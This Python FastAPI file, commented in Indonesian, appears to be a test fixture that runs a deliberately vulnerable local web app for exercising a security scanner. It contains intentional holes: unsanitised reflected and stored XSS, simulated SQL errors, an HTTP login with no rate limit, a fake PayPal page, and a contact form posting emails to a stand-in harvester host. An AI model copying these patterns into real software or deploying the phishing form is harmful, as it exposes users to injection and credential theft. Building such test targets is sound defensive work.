"""
test_dummy_vuln_server.py — Dummy Vulnerable Web Application

Server web sengaja dibuat rentan untuk menguji seluruh fitur Active Scanner.

Kerentanan yang disimulasikan:
1. SQLi Error-based    : GET /search?q=' → memunculkan error mysql_fetch
2. XSS Reflected       : GET /search?q=<script> → di-reflect tanpa sanitasi
3. XSS via form        : POST /comment
4. Form login tanpa rate limit: POST /login (tidak ada proteksi HTTP 429)
5. Banner grabbing     : Header Server & X-Powered-By terekspos
6. Credential harvesting: Form login via HTTP (bukan HTTPS)
7. Brand impersonation : Halaman mengklaim sebagai "PayPal" padahal bukan
8. Path crawlable      : /about, /contact bisa di-crawl

Jalankan di terminal terpisah:
    python test_dummy_vuln_server.py
Lalu uji di Active Scanner dengan URL: http://127.0.0.1:8080/
"""

from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, Response
import uvicorn

app = FastAPI(title="Dummy Vulnerable App for Testing")

# ─── Counter Login (tanpa rate limiting) ─────────────────────────────────────
login_attempts = {}

@app.middleware("http")
async def add_vulnerable_headers(request: Request, call_next):
    """Tambahkan header yang sengaja mengungkap versi server."""
    response = await call_next(request)
    response.headers["Server"] = "Apache/2.4.29 (Ubuntu)"
    response.headers["X-Powered-By"] = "PHP/5.6.40"
    return response

# ─── Home page ───────────────────────────────────────────────────────────────
@app.get("/", response_class=HTMLResponse)
async def home():
    return """
    <html><head><title>PayPal — Secure Payment</title></head>
    <body>
        <h1>Welcome to PayPal</h1>
        <p>Please <a href='/login'>login</a> or <a href='/search'>search</a></p>
        <a href='/about'>About</a> | <a href='/contact'>Contact</a>
    </body></html>
    """

# ─── Login form tanpa rate limiting ──────────────────────────────────────────
@app.get("/login", response_class=HTMLResponse)
async def login_form():
    """Form login di HTTP (bukan HTTPS) — rentan credential harvesting."""
    return """
    <html><body>
        <h2>PayPal Login</h2>
        <form method='post' action='/login'>
            <input type='text' name='username' placeholder='Email'><br>
            <input type='password' name='password' placeholder='Password'><br>
            <input type='submit' value='Login'>
        </form>
    </body></html>
    """

@app.post("/login", response_class=HTMLResponse)
async def login_submit(username: str = Form(""), password: str = Form("")):
    """
    Tidak ada rate limiting sama sekali.
    Setiap request POST selalu diproses → rentan Brute Force.
    """
    return f"<html><body><p>Login failed for {username}. Try again.</p></body></html>"

# ─── Search page rentan SQLi & XSS ───────────────────────────────────────────
@app.get("/search", response_class=HTMLResponse)
async def search(request: Request):
    q = request.query_params.get("q", "")
    
    # Simulasi SQLi Error-based
    sqli_response = ""
    if "'" in q or '"' in q or "OR" in q.upper():
        sqli_response = """
        <p>Warning: mysql_fetch_array() expects parameter 1 to be resource 
        — You have an error in your SQL syntax near ''' at line 1</p>
        """
    
    # Simulasi XSS Reflected (tanpa sanitasi)
    html = f"""
    <html>
    <head><title>Search</title></head>
    <body>
        <h2>Search Results for: {q}</h2>
        {sqli_response}
        <form method='get' action='/search'>
            <input type='text' name='q' value='{q}'>
            <input type='submit' value='Search'>
        </form>
        <form method='post' action='/comment'>
            <textarea name='comment'></textarea>
            <input type='submit' value='Post Comment'>
        </form>
    </body></html>
    """
    return HTMLResponse(content=html)

# ─── Comment form rentan Stored XSS (simulasi) ───────────────────────────────
@app.post("/comment", response_class=HTMLResponse)
async def post_comment(request: Request):
    body = await request.form()
    comment = body.get("comment", "")
    # Tidak ada sanitasi, langsung di-render
    return HTMLResponse(f"<html><body><h2>Comment:</h2>{comment}</body></html>")

# ─── Halaman tambahan untuk crawling ─────────────────────────────────────────
@app.get("/about", response_class=HTMLResponse)
async def about():
    return "<html><body><h1>About</h1><a href='/'>Home</a></body></html>"

@app.get("/contact", response_class=HTMLResponse)
async def contact():
    return """
    <html><body>
        <h1>Contact</h1>
        <form method='post' action='https://evil-harvester.example.com/steal'>
            <input type='email' name='email' placeholder='Your email'>
            <input type='submit' value='Submit'>
        </form>
        <a href='/'>Home</a>
    </body></html>
    """

# ─── Entry point ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("[DUMMY SERVER] Berjalan di http://127.0.0.1:8080")
    print("[DUMMY SERVER] Gunakan URL ini di Active Scanner: http://127.0.0.1:8080/")
    uvicorn.run(app, host="127.0.0.1", port=8080)
